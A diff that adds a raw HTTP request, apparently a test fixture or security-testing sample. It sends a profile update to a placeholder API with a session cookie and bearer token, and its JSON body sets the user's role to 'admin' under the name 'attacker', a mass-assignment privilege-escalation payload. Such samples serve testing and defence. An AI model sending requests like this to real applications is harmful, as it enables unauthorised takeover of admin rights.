@@ -1,0 +1,10 @@
+POST /api/v2/users/1337/profile?debug=true&lang=en HTTP/2
+Host: app.example.com
+Cookie: session=8f3a9c2e7b1d4f6a0e5c9b8a7d6f2543; theme=dark; _ga=GA1.2.1234567890
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3Iiwicm9sZSI6InVzZXIifQ.dXJl
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 86
+
+{"displayName":"attacker","role":"admin","password":"hunter2hunter","tags":["a","b"]}
